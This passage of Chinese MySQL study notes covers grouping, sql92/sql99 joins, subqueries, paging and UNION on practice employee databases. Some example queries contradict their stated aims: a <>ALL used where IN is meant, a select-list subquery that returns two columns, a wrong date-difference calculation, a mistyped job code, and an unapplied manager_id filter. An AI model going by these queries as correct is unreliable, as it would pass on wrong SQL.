分组后筛选	group by后的结果集    		group by后	having

问题1：分组函数做筛选能不能放在where后面
答：不能

问题2：where——group by——having

一般来讲，能用分组前筛选的，尽量使用分组前筛选，提高效率

3、分组可以按单个字段也可以按多个字段
4、可以搭配着排序使用
*/
```

##### 5-1 简单的分组

```sql
#案例1：查询每个工种的员工平均工资
SELECT AVG(salary),job_id
FROM employees
GROUP BY job_id;

#案例2：查询每个位置的部门个数
SELECT COUNT(*),location_id
FROM departments
GROUP BY location_id;
```

##### 5-2 分组前筛选

```sql
#案例1：查询邮箱中包含a字符的 每个部门的最高工资
SELECT MAX(salary),department_id
FROM employees
WHERE email LIKE '%a%'
GROUP BY department_id;

#案例2：查询有奖金的每个领导手下员工的平均工资
SELECT AVG(salary),manager_id
FROM employees
WHERE commission_pct IS NOT NULL
GROUP BY manager_id;
```

##### 5-3 分组后筛选

```sql
#案例：查询哪个部门的员工个数>5
# ①查询每个部门的员工个数
SELECT COUNT(*),department_id
FROM employees
GROUP BY department_id;
#② 筛选刚才①结果
SELECT COUNT(*),department_id
FROM employees
GROUP BY department_id
HAVING COUNT(*)>5;


#案例2：每个工种有奖金的员工的最高工资>12000的工种编号和最高工资
SELECT job_id,MAX(salary)
FROM employees
WHERE commission_pct IS NOT NULL
GROUP BY job_id
HAVING MAX(salary)>12000;

#案例3：领导编号>102的每个领导手下的最低工资大于5000的领导编号和最低工资

manager_id>102

SELECT manager_id,MIN(salary)
FROM employees
GROUP BY manager_id
HAVING MIN(salary)>5000;
```

##### 5-4 添加排序

```sql
#案例：每个工种有奖金的员工的最高工资>6000的工种编号和最高工资,按最高工资升序

SELECT job_id,MAX(salary) m
FROM employees
WHERE commission_pct IS NOT NULL
GROUP BY job_id
HAVING m>6000
ORDER BY m ;

```

##### 5-5 按多个字段分组

```sql
#案例：查询每个工种每个部门的最低工资,并按最低工资降序

SELECT MIN(salary),job_id,department_id
FROM employees
GROUP BY department_id,job_id
ORDER BY MIN(salary) DESC;
```

#### 1.2.6 进阶6：连接查询

```sql
/*
含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询

笛卡尔乘积现象：表1 有m行，表2有n行，结果=m*n行

发生原因：没有有效的连接条件
如何避免：添加有效的连接条件

分类：
	按年代分类：
	sql92标准:仅仅支持内连接
	sql99标准【推荐】：支持内连接+外连接（左外和右外）+交叉连接
	
	按功能分类：
		内连接：
			等值连接
			非等值连接
			自连接
		外连接：
			左外连接
			右外连接
			全外连接
		交叉连接
*/
```

##### 6-1 sql92标准

###### 1-1 等值连接

```SQL
/*
① 多表等值连接的结果为多表的交集部分
② n表连接，至少需要n-1个连接条件
③ 多表的顺序没有要求
④ 一般需要为表起别名
⑤ 可以搭配前面介绍的所有子句使用，比如排序、分组、筛选

*/

#案例1：查询女神名和对应的男神名
SELECT name,boyName 
FROM boys,beauty
WHERE beauty.boyfriend_id= boys.id;

#案例2：查询员工名和对应的部门名
SELECT last_name,department_name
FROM employees,departments
WHERE employees.`department_id`=departments.`department_id`;
```

###### 1-2 给表起别名

```sql
/*
①提高语句的简洁度
②区分多个重名的字段
注意：
    如果为表起了别名，则查询的字段就不能使用原来的表名去限定，
    两个表的顺序可以改变
*/
#查询员工名、工种号、工种名

SELECT e.last_name,e.job_id,j.job_title
FROM employees  e,jobs j
WHERE e.`job_id`=j.`job_id`;
```

###### 1-3 两个表顺序调换

```sql
#查询员工名、工种号、工种名

SELECT e.last_name,e.job_id,j.job_title
FROM jobs j,employees e
WHERE e.`job_id`=j.`job_id`;
```

###### 1-4 可以加筛选

```sql
#案例：查询有奖金的员工名、部门名
SELECT last_name,department_name,commission_pct
FROM employees e,departments d
WHERE e.`department_id`=d.`department_id`
AND e.`commission_pct` IS NOT NULL;

#案例2：查询城市名中第二个字符为o的部门名和城市名
SELECT department_name,city
FROM departments d,locations l
WHERE d.`location_id` = l.`location_id`
AND city LIKE '_o%';
```

###### 1-5 可以加分组

```sql
#案例1：查询每个城市的部门个数
SELECT COUNT(*) 个数,city
FROM departments d,locations l
WHERE d.`location_id`=l.`location_id`
GROUP BY city;


#案例2：查询有奖金的每个部门的部门名和部门的领导编号和该部门的最低工资
SELECT department_name,d.`manager_id`,MIN(salary)
FROM departments d,employees e
WHERE d.`department_id`=e.`department_id`
AND commission_pct IS NOT NULL
GROUP BY department_name,d.`manager_id`;
```

###### 1-6 可以加排序

```sql
#案例：查询每个工种的工种名和员工的个数，并且按员工个数降序
SELECT job_title,COUNT(*)
FROM employees e,jobs j
WHERE e.`job_id`=j.`job_id`
GROUP BY job_title
ORDER BY COUNT(*) DESC;

```

###### 1-7 三表连接

```sql
#案例：查询员工名、部门名和所在的城市
SELECT last_name,department_name,city
FROM employees e,departments d,locations l
WHERE e.`department_id`=d.`department_id`
AND d.`location_id`=l.`location_id`
AND city LIKE 's%'
ORDER BY department_name DESC;

```

###### 1-8 非等值连接

```sql
#案例1：查询员工的工资和工资级别


SELECT salary,grade_level
FROM employees e,job_grades g
WHERE salary BETWEEN g.`lowest_sal` AND g.`highest_sal`
AND g.`grade_level`='A';

/*
select salary,employee_id from employees;
select * from job_grades;
CREATE TABLE job_grades
(grade_level VARCHAR(3),
 lowest_sal  int,
 highest_sal int);

INSERT INTO job_grades
VALUES ('A', 1000, 2999);

INSERT INTO job_grades
VALUES ('B', 3000, 5999);

INSERT INTO job_grades
VALUES('C', 6000, 9999);

INSERT INTO job_grades
VALUES('D', 10000, 14999);

INSERT INTO job_grades
VALUES('E', 15000, 24999);

INSERT INTO job_grades
VALUES('F', 25000, 40000);

*/
```

###### 1-9 自连接

```sql
#案例：查询 员工名和上级的名称
SELECT e.employee_id,e.last_name,m.employee_id,m.last_name
FROM employees e,employees m
WHERE e.`manager_id`=m.`employee_id`;

## 自连接就是把一张表用两次来查询数据
```

###### 1-10 案例讲解

```sql
## 单行函数
    #1.	显示系统时间(注：日期+时间)
    SELECT NOW();

    #2.	查询员工号，姓名，工资，以及工资提高百分之20%后的结果（new salary）
    SELECT employee_id,last_name,salary,salary*1.2 "new salary"
    FROM employees;
    #3.	将员工的姓名按首字母排序，并写出姓名的长度（length）
    SELECT LENGTH(last_name) 长度,SUBSTR(last_name,1,1) 首字符,last_name
    FROM employees
    ORDER BY 首字符;

    #4.	做一个查询，产生下面的结果
    <last_name> earns <salary> monthly but wants <salary*3>
    Dream Salary
    King earns 24000 monthly but wants 72000

    SELECT CONCAT(last_name,' earns ',salary,' monthly but wants ',salary*3) AS "Dream 			Salary"
    FROM employees
    WHERE salary=24000;

    #5.	使用case-when，按照下面的条件：
    job                  grade
    AD_PRES            A
    ST_MAN             B
    IT_PROG             C
    SA_REP              D
    ST_CLERK           E
    产生下面的结果
    Last_name	Job_id	Grade
    king	AD_PRES	A

    SELECT last_name,job_id AS  job,
    CASE job_id
    WHEN 'AD_PRES' THEN 'A' 
    WHEN 'ST_MAN' THEN 'B' 
    WHEN 'IT_PROG' THEN 'C' 
    WHEN 'SA_PRE' THEN 'D'
    WHEN 'ST_CLERK' THEN 'E'
    END AS Grade
    FROM employees
    WHERE job_id = 'AD_PRES';

#分组查询
    #1.查询各job_id的员工工资的最大值，最小值，平均值，总和，并按job_id升序
    SELECT MAX(salary),MIN(salary),AVG(salary),SUM(salary),job_id
    FROM employees
    GROUP BY job_id
    ORDER BY job_id;


    #2.查询员工最高工资和最低工资的差距（DIFFERENCE）
    SELECT MAX(salary)-MIN(salary) DIFFRENCE
    FROM employees;

    #3.查询各个管理者手下员工的最低工资，其中最低工资不能低于6000，没有管理者的员工不计算在内
    SELECT MIN(salary),manager_id
    FROM employees
    WHERE manager_id IS NOT NULL
    GROUP BY manager_id
    HAVING MIN(salary)>=6000;

    #4.查询所有部门的编号，员工数量和工资平均值,并按平均工资降序
    SELECT department_id,COUNT(*),AVG(salary) a
    FROM employees
    GROUP BY department_id
    ORDER BY a DESC;

    #5.选择具有各个job_id的员工人数
    SELECT COUNT(*) 个数,job_id
    FROM employees
    GROUP BY job_id;
    
## 排序查询
    #1.查询员工的姓名和部门号和年薪，按年薪降序 按姓名升序
    SELECT last_name,department_id,salary*12*(1+IFNULL(commission_pct,0)) 年薪
    FROM employees
    ORDER BY 年薪 DESC,last_name ASC;


    #2.选择工资不在8000到17000的员工的姓名和工资，按工资降序
    SELECT last_name,salary
    FROM employees
    WHERE salary NOT BETWEEN 8000 AND 17000
    ORDER BY salary DESC;

    #3.查询邮箱中包含e的员工信息，并先按邮箱的字节数降序，再按部门号升序
    SELECT *,LENGTH(email)
    FROM employees
    WHERE email LIKE '%e%'
    ORDER BY LENGTH(email) DESC,department_id ASC;
    
    
# 分组函数
    #1.查询公司员工工资的最大值，最小值，平均值，总和
    SELECT MAX(salary) 最大值,MIN(salary) 最小值,AVG(salary) 平均值,SUM(salary) 和
    FROM employees;

    #2.查询员工表中的最大入职时间和最小入职时间的相差天数 （DIFFRENCE）
    SELECT MAX(hiredate) 最大,MIN(hiredate) 最小,(MAX(hiredate)-MIN(hiredate))/1000/3600/24 DIFFRENCE
    FROM employees;
    SELECT DATEDIFF(MAX(hiredate),MIN(hiredate)) DIFFRENCE
    FROM employees;
    SELECT DATEDIFF('1995-2-7','1995-2-6');


    #3.查询部门编号为90的员工个数
    SELECT COUNT(*) FROM employees WHERE department_id = 90;
```

##### 6-2 sql99语法

```sql
/*
语法：
	select 查询列表
	from 表1 别名 【连接类型】
	join 表2 别名 
	on 连接条件
	【where 筛选条件】
	【group by 分组】
	【having 筛选条件】
	【order by 排序列表】
	
分类：
内连接（★）：inner
外连接
	左外(★):left 【outer】
	右外(★)：right 【outer】
	全外：full【outer】
交叉连接：cross 
*/

```

###### 2-1 内连接

```sql
/*
语法：
select 查询列表
from 表1 别名
inner join 表2 别名
on 连接条件;

分类：
等值
非等值
自连接

特点：
①添加排序、分组、筛选
②inner可以省略
③ 筛选条件放在where后面，连接条件放在on后面，提高分离性，便于阅读
④inner join连接和sql92语法中的等值连接效果是一样的，都是查询多表的交集
*/
```

###### 2-2 等值连接

```sql
#案例1.查询员工名、部门名
SELECT last_name,department_name
FROM departments d
 JOIN  employees e
ON e.`department_id` = d.`department_id`;



#案例2.查询名字中包含e的员工名和工种名（添加筛选）
    SELECT last_name,job_title
    FROM employees e
    INNER JOIN jobs j
    ON e.`job_id`=  j.`job_id`
    WHERE e.`last_name` LIKE '%e%';



#3. 查询部门个数>3的城市名和部门个数，（添加分组+筛选）
    #①查询每个城市的部门个数
    #②在①结果上筛选满足条件的
    SELECT city,COUNT(*) 部门个数
    FROM departments d
    INNER JOIN locations l
    ON d.`location_id`=l.`location_id`
    GROUP BY city
    HAVING COUNT(*)>3;




#案例4.查询哪个部门的员工个数>3的部门名和员工个数，并按个数降序（添加排序）
    #①查询每个部门的员工个数
    SELECT COUNT(*),department_name
    FROM employees e
    INNER JOIN departments d
    ON e.`department_id`=d.`department_id`
    GROUP BY department_name

    #② 在①结果上筛选员工个数>3的记录，并排序
    SELECT COUNT(*) 个数,department_name
    FROM employees e
    INNER JOIN departments d
    ON e.`department_id`=d.`department_id`
    GROUP BY department_name
    HAVING COUNT(*)>3
    ORDER BY COUNT(*) DESC;

#5.查询员工名、部门名、工种名，并按部门名降序（添加三表连接）
SELECT last_name,department_name,job_title
FROM employees e
INNER JOIN departments d ON e.`department_id`=d.`department_id`
INNER JOIN jobs j ON e.`job_id` = j.`job_id`
ORDER BY department_name DESC;

```

###### 2-3 非等值连接

```sql
#查询员工的工资级别
SELECT salary,grade_level
FROM employees e
 JOIN job_grades g
 ON e.`salary` BETWEEN g.`lowest_sal` AND g.`highest_sal`;
 
 
 #查询工资级别的个数>20的个数，并且按工资级别降序
 SELECT COUNT(*),grade_level
FROM employees e
 JOIN job_grades g
 ON e.`salary` BETWEEN g.`lowest_sal` AND g.`highest_sal`
 GROUP BY grade_level
 HAVING COUNT(*)>20
 ORDER BY grade_level DESC;
```

###### 2-4 自连接

```sql
 #查询员工的名字、上级的名字
 SELECT e.last_name,m.last_name
 FROM employees e
 JOIN employees m
 ON e.`manager_id`= m.`employee_id`;
 
  #查询姓名中包含字符k的员工的名字、上级的名字
 SELECT e.last_name,m.last_name
 FROM employees e
 JOIN employees m
 ON e.`manager_id`= m.`employee_id`
 WHERE e.`last_name` LIKE '%k%';
```

###### 2-5 外连接

```sql
 /*
 应用场景：用于查询一个表中有，另一个表没有的记录
 
 特点：
 1、外连接的查询结果为主表中的所有记录
	如果从表中有和它匹配的，则显示匹配的值
	如果从表中没有和它匹配的，则显示null
	外连接查询结果=内连接结果+主表中有而从表没有的记录
 2、左外连接，left join左边的是主表
    右外连接，right join右边的是主表
 3、左外和右外交换两个表的顺序，可以实现同样的效果 
 4、全外连接=内连接的结果+表1中有但表2没有的+表2中有但表1没有的
 */
 #引入：查询男朋友 不在男神表的的女神名
 
 SELECT * FROM beauty;
 SELECT * FROM boys;
```

###### 2-6 左外连接

```sql
 SELECT b.*,bo.*
 FROM boys bo
 LEFT OUTER JOIN beauty b
 ON b.`boyfriend_id` = bo.`id`
 WHERE b.`id` IS NULL;
 
 
 #案例1：查询哪个部门没有员工
 #左外
 SELECT d.*,e.employee_id
 FROM departments d
 LEFT OUTER JOIN employees e
 ON d.`department_id` = e.`department_id`
 WHERE e.`employee_id` IS NULL;
```

###### 2-7 右外连接

```sql
  SELECT d.*,e.employee_id
 FROM employees e
 RIGHT OUTER JOIN departments d
 ON d.`department_id` = e.`department_id`
 WHERE e.`employee_id` IS NULL;
```

###### 2-8 全连接

```sql
 USE girls;
 SELECT b.*,bo.*
 FROM beauty b
 FULL OUTER JOIN boys bo
 ON b.`boyfriend_id` = bo.id;
```

###### 2-9 交叉连接

```sql
 SELECT b.*,bo.*
 FROM beauty b
 CROSS JOIN boys bo;
```

###### 2-10 sql92和slq99pk

```sql
 #sql92和 sql99pk
 /*
 功能：sql99支持的较多
 可读性：sql99实现连接条件和筛选条件的分离，可读性较高
 */
```

###### 2-11 案例练习

```sql
## 连接查询
#1.显示所有员工的姓名，部门号和部门名称。
USE myemployees;

SELECT last_name,d.department_id,department_name
FROM employees e,departments d
WHERE e.`department_id` = d.`department_id`;

#2.查询90号部门员工的job_id和90号部门的location_id
SELECT job_id,location_id
FROM employees e,departments d
WHERE e.`department_id`=d.`department_id`
AND e.`department_id`=90;

#3.	选择所有有奖金的员工的
last_name , department_name , location_id , city

SELECT last_name , department_name , l.location_id , city
FROM employees e,departments d,locations l
WHERE e.department_id = d.department_id
AND d.location_id=l.location_id
AND e.commission_pct IS NOT NULL;
#4.选择city在Toronto工作的员工的
last_name , job_id , department_id , department_name 

SELECT last_name , job_id , d.department_id , department_name 
FROM employees e,departments d ,locations l
WHERE e.department_id = d.department_id
AND d.location_id=l.location_id
AND city = 'Toronto';

#5.查询每个工种、每个部门的部门名、工种名和最低工资
SELECT department_name,job_title,MIN(salary) 最低工资
FROM employees e,departments d,jobs j
WHERE e.`department_id`=d.`department_id`
AND e.`job_id`=j.`job_id`
GROUP BY department_name,job_title;

#6.查询每个国家下的部门个数大于2的国家编号
SELECT country_id,COUNT(*) 部门个数
FROM departments d,locations l
WHERE d.`location_id`=l.`location_id`
GROUP BY country_id
HAVING 部门个数>2;

#7、选择指定员工的姓名，员工号，以及他的管理者的姓名和员工号，结果类似于下面的格式
employees	Emp#	manager	Mgr#
kochhar		101	king	100

SELECT e.last_name employees,e.employee_id "Emp#",m.last_name manager,m.employee_id "Mgr#"
FROM employees e,employees m
WHERE e.manager_id = m.employee_id
AND e.last_name='kochhar';


## 外连接


#一、查询编号>3的女神的男朋友信息，如果有则列出详细，如果没有，用null填充
SELECT b.id,b.name,bo.*
FROM beauty b
LEFT OUTER JOIN boys bo
ON b.`boyfriend_id` = bo.`id`
WHERE b.`id`>3;

#二、查询哪个城市没有部门
SELECT city
FROM departments d
RIGHT OUTER JOIN locations l 
ON d.`location_id`=l.`location_id`
WHERE  d.`department_id` IS NULL;

#三、查询部门名为SAL或IT的员工信息
SELECT e.*,d.department_name,d.`department_id`
FROM departments  d
LEFT JOIN employees e
ON d.`department_id` = e.`department_id`
WHERE d.`department_name` IN('SAL','IT');

SELECT * FROM departments
WHERE `department_name` IN('SAL','IT');

## 子查询
#1.	查询和Zlotkey相同部门的员工姓名和工资
    #①查询Zlotkey的部门
    SELECT department_id
    FROM employees
    WHERE last_name = 'Zlotkey'
    #②查询部门号=①的姓名和工资
    SELECT last_name,salary
    FROM employees
    WHERE department_id = (
        SELECT department_id
        FROM employees
        WHERE last_name = 'Zlotkey'
    )

#2.查询工资比公司平均工资高的员工的员工号，姓名和工资。
    #①查询平均工资
    SELECT AVG(salary)
    FROM employees
    #②查询工资>①的员工号，姓名和工资。
    SELECT last_name,employee_id,salary
    FROM employees
    WHERE salary>(
        SELECT AVG(salary)
        FROM employees
    );



#3.查询各部门中工资比本部门平均工资高的员工的员工号, 姓名和工资
    #①查询各部门的平均工资
    SELECT AVG(salary),department_id
    FROM employees
    GROUP BY department_id

    #②连接①结果集和employees表，进行筛选
    SELECT employee_id,last_name,salary,e.department_id
    FROM employees e
    INNER JOIN (
        SELECT AVG(salary) ag,department_id
        FROM employees
        GROUP BY department_id
    ) ag_dep
    ON e.department_id = ag_dep.department_id
    WHERE salary>ag_dep.ag ;



#4.	查询和姓名中包含字母u的员工在相同部门的员工的员工号和姓名
    #①查询姓名中包含字母u的员工的部门
    SELECT  DISTINCT department_id
    FROM employees
    WHERE last_name LIKE '%u%'
    #②查询部门号=①中的任意一个的员工号和姓名
    SELECT last_name,employee_id
    FROM employees
    WHERE department_id IN(
        SELECT  DISTINCT department_id
        FROM employees
        WHERE last_name LIKE '%u%'
    );


#5. 查询在部门的location_id为1700的部门工作的员工的员工号
    #①查询location_id为1700的部门
    SELECT DISTINCT department_id
    FROM departments 
    WHERE location_id  = 1700

    #②查询部门号=①中的任意一个的员工号
    SELECT employee_id
    FROM employees
    WHERE department_id =ANY(
        SELECT DISTINCT department_id
        FROM departments 
        WHERE location_id  = 1700
    );
#6.查询管理者是King的员工姓名和工资
    #①查询姓名为king的员工编号
    SELECT employee_id
    FROM employees
    WHERE last_name  = 'K_ing'

    #②查询哪个员工的manager_id = ①
    SELECT last_name,salary
    FROM employees
    WHERE manager_id IN(
        SELECT employee_id
        FROM employees
        WHERE last_name  = 'K_ing'
    );

#7.查询工资最高的员工的姓名，要求first_name和last_name显示为一列，列名为 姓.名
    #①查询最高工资
    SELECT MAX(salary)
    FROM employees
    #②查询工资=①的姓.名
    SELECT CONCAT(first_name,last_name) "姓.名"
    FROM employees
    WHERE salary=(
        SELECT MAX(salary)
        FROM employees
    );

```

#### 1.2.7 进阶7：子查询

```sql
/*
含义：
出现在其他语句中的select语句，称为子查询或内查询
外部的查询语句，称为主查询或外查询

分类：
按子查询出现的位置：
	select后面：
		仅仅支持标量子查询
	
	from后面：
		支持表子查询
	where或having后面：★
		标量子查询（单行） √
		列子查询  （多行） √
		行子查询
	
	exists后面（相关子查询）
		表子查询
按结果集的行列数不同：
	标量子查询（结果集只有一行一列）
	列子查询（结果集只有一列多行）
	行子查询（结果集有一行多列）
	表子查询（结果集一般为多行多列）
*/
```

##### 7-1 where或having后面

```sql
/*
1、标量子查询（单行子查询）
2、列子查询（多行子查询）
3、行子查询（多列多行）
特点：
①子查询放在小括号内
②子查询一般放在条件的右侧
③标量子查询，一般搭配着单行操作符使用
> < >= <= = <>

列子查询，一般搭配着多行操作符使用
in、any/some、all
④子查询的执行优先于主查询执行，主查询的条件用到了子查询的结果

*/
```

###### 1-1 标量子查询

```sql
#案例1：谁的工资比 Abel 高?
    #①查询Abel的工资
    SELECT salary
    FROM employees
    WHERE last_name = 'Abel'
    #②查询员工的信息，满足 salary>①结果
    SELECT *
    FROM employees
    WHERE salary>(

        SELECT salary
        FROM employees
        WHERE last_name = 'Abel'
    );

#案例2：返回job_id与141号员工相同，salary比143号员工多的员工 姓名，job_id 和工资
    #①查询141号员工的job_id
    SELECT job_id
    FROM employees
    WHERE employee_id = 141
    #②查询143号员工的salary
    SELECT salary
    FROM employees
    WHERE employee_id = 143

    #③查询员工的姓名，job_id 和工资，要求job_id=①并且salary>②
    SELECT last_name,job_id,salary
    FROM employees
    WHERE job_id = (
        SELECT job_id
        FROM employees
        WHERE employee_id = 141
    ) AND salary>(
        SELECT salary
        FROM employees
        WHERE employee_id = 143
    );


#案例3：返回公司工资最少的员工的last_name,job_id和salary
    #①查询公司的 最低工资
    SELECT MIN(salary)
    FROM employees
    #②查询last_name,job_id和salary，要求salary=①
    SELECT last_name,job_id,salary
    FROM employees
    WHERE salary=(
        SELECT MIN(salary)
        FROM employees
    );


#案例4：查询最低工资大于50号部门最低工资的部门id和其最低工资
    #①查询50号部门的最低工资
    SELECT  MIN(salary)
    FROM employees
    WHERE department_id = 50
    #②查询每个部门的最低工资
    SELECT MIN(salary),department_id
    FROM employees
    GROUP BY department_id

#③ 在②基础上筛选，满足min(salary)>①
    SELECT MIN(salary),department_id
    FROM employees
    GROUP BY department_id
    HAVING MIN(salary)>(
        SELECT  MIN(salary)
        FROM employees
        WHERE department_id = 50
    );

#非法使用标量子查询
    SELECT MIN(salary),department_id
    FROM employees
    GROUP BY department_id
    HAVING MIN(salary)>(
        SELECT  salary
        FROM employees
        WHERE department_id = 250
    );
```

###### 1-2 列子查询

```sql
#案例1：返回location_id是1400或1700的部门中的所有员工姓名
    #①查询location_id是1400或1700的部门编号
    SELECT DISTINCT department_id
    FROM departments
    WHERE location_id IN(1400,1700)
    #②查询员工姓名，要求部门号是①列表中的某一个

    SELECT last_name
    FROM employees
    WHERE department_id  <>ALL(
        SELECT DISTINCT department_id
        FROM departments
        WHERE location_id IN(1400,1700)
    );


#案例2：返回其它工种中比job_id为‘IT_PROG’工种任一工资低的员工的员工号、姓名、job_id 以及salary
    #①查询job_id为‘IT_PROG’部门任一工资
    SELECT DISTINCT salary
    FROM employees
    WHERE job_id = 'IT_PROG'
    #②查询员工号、姓名、job_id 以及salary，salary<(①)的任意一个
    SELECT last_name,employee_id,job_id,salary
    FROM employees
    WHERE salary<ANY(
        SELECT DISTINCT salary
        FROM employees
        WHERE job_id = 'IT_PROG'
    ) AND job_id<>'IT_PROG';

#或
    SELECT last_name,employee_id,job_id,salary
    FROM employees
    WHERE salary<(
        SELECT MAX(salary)
        FROM employees
        WHERE job_id = 'IT_PROG'

    ) AND job_id<>'IT_PROG';


#案例3：返回其它部门中比job_id为‘IT_PROG’部门所有工资都低的员工   的员工号、姓名、job_id 以及salary
    SELECT last_name,employee_id,job_id,salary
    FROM employees
    WHERE salary<ALL(
        SELECT DISTINCT salary
        FROM employees
        WHERE job_id = 'IT_PROG'

    ) AND job_id<>'IT_PROG';

#或

    SELECT last_name,employee_id,job_id,salary
    FROM employees
    WHERE salary<(
        SELECT MIN( salary)
        FROM employees
        WHERE job_id = 'IT_PROG'

    ) AND job_id<>'IT_PROG';

```

###### 1-3 行子查询

```sql
##行子查询（结果集一行多列或多行多列）

#案例：查询员工编号最小并且工资最高的员工信息
SELECT * 
FROM employees
WHERE (employee_id,salary)=(
	SELECT MIN(employee_id),MAX(salary)
	FROM employees
);

    #①查询最小的员工编号
    SELECT MIN(employee_id)
    FROM employees
    #②查询最高工资
    SELECT MAX(salary)
    FROM employees
    #③查询员工信息
    SELECT *
    FROM employees
    WHERE employee_id=(
        SELECT MIN(employee_id)
        FROM employees
    )AND salary=(
        SELECT MAX(salary)
        FROM employees
    );
```

##### 7-2 select后面

```sql
/*
仅仅支持标量子查询
*/

#案例：查询每个部门的员工个数
SELECT d.*,(

	SELECT COUNT(*)
	FROM employees e
	WHERE e.department_id = d.`department_id`
 ) 个数
 FROM departments d;
 
 
 #案例2：查询员工号=102的部门名
SELECT (
	SELECT department_name,e.department_id
	FROM departments d
	INNER JOIN employees e
	ON d.department_id=e.department_id
	WHERE e.employee_id=102	
) 部门名;

```

##### 7-3 from后面

```sql
/*
将子查询结果充当一张表，要求必须起别名
*/

#案例：查询每个部门的平均工资的工资等级
#①查询每个部门的平均工资
SELECT AVG(salary),department_id
FROM employees
GROUP BY department_id
SELECT * FROM job_grades;

#②连接①的结果集和job_grades表，筛选条件平均工资 between lowest_sal and highest_sal

SELECT  ag_dep.*,g.`grade_level`
FROM (
	SELECT AVG(salary) ag,department_id
	FROM employees
	GROUP BY department_id
) ag_dep
INNER JOIN job_grades g
ON ag_dep.ag BETWEEN lowest_sal AND highest_sal;

```

##### 7-4 exists后面

```sql
#四、exists后面（相关子查询）

/*
语法：
exists(完整的查询语句)
结果：
1或0
*/

SELECT EXISTS(SELECT employee_id FROM employees WHERE salary=300000);

#案例1：查询有员工的部门名
#in
SELECT department_name
FROM departments d
WHERE d.`department_id` IN(
	SELECT department_id
	FROM employees
)

#exists
SELECT department_name
FROM departments d
WHERE EXISTS(
	SELECT *
	FROM employees e
	WHERE d.`department_id`=e.`department_id`
);


#案例2：查询没有女朋友的男神信息
#in
SELECT bo.*
FROM boys bo
WHERE bo.id NOT IN(
	SELECT boyfriend_id
	FROM beauty
)

#exists
SELECT bo.*
FROM boys bo
WHERE NOT EXISTS(
	SELECT boyfriend_id
	FROM beauty b
	WHERE bo.`id`=b.`boyfriend_id`
);

```

#### 1.2.8 进阶8：分页查询

```sql
/*
应用场景：当要显示的数据，一页显示不全，需要分页提交sql请求
语法：
	select 查询列表
	from 表
	【join type join 表2
	on 连接条件
	where 筛选条件
	group by 分组字段
	having 分组后的筛选
	order by 排序的字段】
	limit 【offset,】size;
	
	offset要显示条目的起始索引（起始索引从0开始）
	size 要显示的条目个数
特点：
	①limit语句放在查询语句的最后
	②公式
	要显示的页数 page，每页的条目数size
	
	select 查询列表
	from 表
	limit (page-1)*size,size;
	size=10
	page  
	1	0
	2  	10
	3	20
	
*/
#案例1：查询前五条员工信息
SELECT * FROM  employees LIMIT 0,5;
SELECT * FROM  employees LIMIT 5;

#案例2：查询第11条——第25条
SELECT * FROM  employees LIMIT 10,15;

#案例3：有奖金的员工信息，并且工资较高的前10名显示出来
SELECT 
    * 
FROM
    employees 
WHERE commission_pct IS NOT NULL 
ORDER BY salary DESC 
LIMIT 10 ;

```

#### 1.2.9 进阶9：联合查询

```sql
/*
union 联合 合并：将多条查询语句的结果合并成一个结果
语法：
查询语句1
union
查询语句2
union
...

应用场景：
要查询的结果来自于多个表，且多个表没有直接的连接关系，但查询的信息一致时
特点：★
1、要求多条查询语句的查询列数是一致的！
2、要求多条查询语句的查询的每一列的类型和顺序最好一致
3、union关键字默认去重，如果使用union all 可以包含重复项
*/


#引入的案例：查询部门编号>90或邮箱包含a的员工信息
SELECT * FROM employees WHERE email LIKE '%a%' OR department_id>90;;
SELECT * FROM employees  WHERE email LIKE '%a%'
UNION
SELECT * FROM employees  WHERE department_id>90;


#案例：查询中国用户中男性的信息以及外国用户中年男性的用户信息
SELECT id,cname FROM t_ca WHERE csex='男'
UNION ALL
SELECT t_id,tname FROM t_ua WHERE tGender='male';
```

#### 1.2.10 子查询经典案例

```mysql
# 1. 查询工资最低的员工信息: last_name, salary

#①查询最低的工资
SELECT MIN(salary)
FROM employees

#②查询last_name,salary，要求salary=①
SELECT last_name,salary
FROM employees
WHERE salary=(
	SELECT MIN(salary)
	FROM employees
);

# 2. 查询平均工资最低的部门信息

#方式一：
#①各部门的平均工资
SELECT AVG(salary),department_id
FROM employees
GROUP BY department_id
#②查询①结果上的最低平均工资
SELECT MIN(ag)
FROM (
	SELECT AVG(salary) ag,department_id
	FROM employees
	GROUP BY department_id
) ag_dep

#③查询哪个部门的平均工资=②

SELECT AVG(salary),department_id
FROM employees
GROUP BY department_id
HAVING AVG(salary)=(
	SELECT MIN(ag)
	FROM (
		SELECT AVG(salary) ag,department_id
		FROM employees
		GROUP BY department_id
	) ag_dep

);

#④查询部门信息

SELECT d.*
FROM departments d
WHERE d.`department_id`=(
	SELECT department_id
	FROM employees
	GROUP BY department_id
	HAVING AVG(salary)=(
		SELECT MIN(ag)
		FROM (
			SELECT AVG(salary) ag,department_id
			FROM employees
			GROUP BY department_id
		) ag_dep

	)

);

#方式二：
#①各部门的平均工资
SELECT AVG(salary),department_id
FROM employees
GROUP BY department_id

#②求出最低平均工资的部门编号
SELECT department_id
FROM employees
GROUP BY department_id
ORDER BY AVG(salary) 
LIMIT 1;

#③查询部门信息
SELECT *
FROM departments
WHERE department_id=(
	SELECT department_id
	FROM employees
	GROUP BY department_id
	ORDER BY AVG(salary) 
	LIMIT 1
);




# 3. 查询平均工资最低的部门信息和该部门的平均工资
#①各部门的平均工资
SELECT AVG(salary),department_id
FROM employees
GROUP BY department_id
#②求出最低平均工资的部门编号
SELECT AVG(salary),department_id
FROM employees
GROUP BY department_id
ORDER BY AVG(salary) 
LIMIT 1;
#③查询部门信息
SELECT d.*,ag
FROM departments d
JOIN (
	SELECT AVG(salary) ag,department_id
	FROM employees
	GROUP BY department_id
	ORDER BY AVG(salary) 
	LIMIT 1

) ag_dep
ON d.`department_id`=ag_dep.department_id;



# 4. 查询平均工资最高的 job 信息
#①查询最高的job的平均工资
SELECT AVG(salary),job_id
FROM employees
GROUP BY job_id
ORDER BY AVG(salary) DESC
LIMIT 1

#②查询job信息
SELECT * 
FROM jobs
WHERE job_id=(
	SELECT job_id
	FROM employees
	GROUP BY job_id
	ORDER BY AVG(salary) DESC
	LIMIT 1

);
# 5. 查询平均工资高于公司平均工资的部门有哪些?

#①查询平均工资
SELECT AVG(salary)
FROM employees

#②查询每个部门的平均工资
SELECT AVG(salary),department_id
FROM employees
GROUP BY department_id

#③筛选②结果集，满足平均工资>①

SELECT AVG(salary),department_id
FROM employees
GROUP BY department_id
HAVING AVG(salary)>(
	SELECT AVG(salary)
	FROM employees

);

# 6. 查询出公司中所有 manager 的详细信息.
